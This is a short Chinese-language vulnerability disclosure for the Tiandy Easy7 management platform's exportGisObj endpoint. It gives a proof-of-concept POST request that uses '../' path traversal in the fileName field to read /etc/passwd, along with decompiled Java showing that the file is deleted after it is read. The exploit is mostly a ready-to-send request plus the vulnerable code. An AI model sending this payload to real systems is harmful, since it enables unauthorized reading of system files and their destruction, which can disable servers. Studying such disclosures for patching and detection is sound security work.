# 天地伟业Easy7-exportGisObj 存在任意文件读取删除漏洞

天地伟业Easy7综合管理平台

poc 

```java
POST /xxxx/exportGisObj HTTP/1.1
Host: xx.xxx.xxx.xxx:7000
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:140.0)Gecko/20100101Firefox/140.0
Content-Type:application/x-www-form-urlencoded;
charset=UTF-8
Content-Length: 25

fileName=../../../../../../etc/passwd
```

找到文件读取路径，发现没有任何过滤。直接获取更目录，然后通过输入的filename作为文件名字，如果输入../../../../，直接跳到了linux系统的根目录，进而读取到了passwd.

```java
@RequestMapping({"/exportGisObj"})
public void exportGisObj(HttpServletRequest request, HttpServletResponse response, CLS_VO_Obj_ObjGis voObjGisObj) throws Exception {
    String filePath = request.getRealPath("/");
    String fileName = voObjGisObj.getFileName();
    if (null != fileName && !"".equals(fileName)) {
        Tools.outFile(response, fileName, filePath + fileName);
    } else {
        response.getWriter().println(JSONObject.fromObject(this.boGis.exportGisObj(voObjGisObj, filePath)));
    }

}
```

需要注意是，这个调用的outFile函数，在加载文件以后，执行了：f.delete(); 直接删除了文件。

```java
public static void outFile(HttpServletResponse resp, String fileName, String fileUrl) throws IOException {
    ServletOutputStream out = resp.getOutputStream();
    fileName = URLEncoder.encode(fileName, "UTF-8");
    resp.setHeader("Content-disposition", "attachment;filename=" + fileName);
    BufferedInputStream bis = null;
    BufferedOutputStream bos = null;

    try {
        InputStream inputStream = new FileInputStream(fileUrl);
        bis = new BufferedInputStream(inputStream);
        bos = new BufferedOutputStream(out);
        byte[] buff = new byte[2048];

        int bytesRead;
        while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
            bos.write(buff, 0, bytesRead);
        }
    } catch (IOException e) {
        e.printStackTrace();
    } finally {
        if (bis != null) {
            bis.close();
        }

        if (bos != null) {
            bos.close();
        }

        File f = new File(fileUrl);
        f.delete();
    }

}
```

# 